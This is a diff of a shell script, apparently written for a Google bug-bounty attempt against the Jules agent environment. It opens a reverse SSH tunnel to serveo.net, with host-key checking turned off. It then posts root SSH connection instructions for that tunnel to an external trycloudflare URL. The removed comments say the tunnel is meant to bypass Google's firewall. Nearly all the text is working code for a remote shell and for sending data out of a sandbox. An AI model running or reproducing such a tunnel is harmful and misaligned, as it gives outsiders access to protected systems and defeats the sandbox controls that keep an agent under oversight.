@@ -3,23 +3,23 @@
 
 URL="https://rainbow-nutrition-bottom-beginners.trycloudflare.com"
 
-# --- THE SSH BRIDGE ---
-# This opens a tunnel from Jules to Serveo.net
-# It bypasses Google's firewall by using standard SSH Port 22/443
-ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:22 serveo.net 2>&1 > /tmp/ssh_info &
+ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -f -R 0:localhost:22 serveo.net sleep 3600 2>&1 > /tmp/ssh_info
 
-# Give the tunnel a few seconds to stabilize
-sleep 7
+# Wait 10 seconds (gives Serveo more time to assign a port)
+sleep 10
 
-# --- THE LINK BROADCAST ---
-# Grabs the assigned forwarding address from the log file
-SSH_LINK=$(grep -o "https://.*\.serveo.net" /tmp/ssh_info || grep -o "forwarding TCP traffic from .*" /tmp/ssh_info)
+# Grab the SPECIFIC port from the log
+SSH_PORT=$(grep -oE "port [0-9]+" /tmp/ssh_info | awk '{print $2}')
 
 {
   echo "--- GOOGLE VRP: SSH SESSION READY ---"
   echo "TIMESTAMP: $(date)"
-  echo "COMMAND TO RUN ON YOUR MAC:"
-  echo "ssh -v root@serveo.net (or the link below)"
-  echo "$SSH_LINK"
+  if [ -z "$SSH_PORT" ]; then
+    echo "ERROR: Serveo didn't assign a port yet. Log output:"
+    cat /tmp/ssh_info
+  else
+    echo "COMMAND TO RUN ON YOUR MAC:"
+    echo "ssh -v -p $SSH_PORT root@serveo.net"
+  fi
   echo "--------------------------------------"
-} | curl -s -k -X POST --data-binary @- "$URL"
+} | curl -s -X POST --data-binary @- "$URL"
